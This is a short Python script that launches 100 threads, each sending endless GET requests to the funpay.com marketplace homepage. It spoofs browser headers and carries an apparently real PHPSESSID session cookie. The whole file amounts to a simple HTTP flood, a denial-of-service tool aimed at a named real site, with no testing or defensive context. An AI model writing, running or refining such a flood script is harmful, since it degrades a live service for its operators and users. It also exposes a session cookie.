import threading
import requests
import time

url = "https://funpay.com/"

headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "ru,en;q=0.9",
    "priority": "u=0, i",
    "referer": "https://funpay.com/lots/221/",
    "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"YaBrowser\";v=\"25.4\", \"Yowser\";v=\"2.5\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 YaBrowser/25.4.0.0 Safari/537.36"
}

cookies = {
    "_ym_uid": "1731606429887886246",
    "_ym_d": "1731606429",
    "_ga": "GA1.1.463741767.1731606444",
    "cookie_prefs": "1",
    "_gcl_au": "1.1.1525099994.1740041483.1920808685.1746382021.1746382020",
    "_ym_isad": "2",
    "PHPSESSID": "XB0mZyWgU0hOvg3MtqjzQ2LOdhMFmhWC",
    "fav_games": "81-123-224-159-44-286-335-641",
    "_ga_STVL2Q8BNQ": "GS2.1.s1747074719$o86$g1$t1747078479$j1$l0$h666540499"
}

def send_requests():
    while True:
        try:
            response = requests.get(url, headers=headers, cookies=cookies)
            print(f"Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# Запускаем 100 потоков
threads = []
for _ in range(100):
    t = threading.Thread(target=send_requests)
    t.daemon = True
    t.start()
    threads.append(t)

# Удерживаем выполнение
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Остановлено пользователем.")
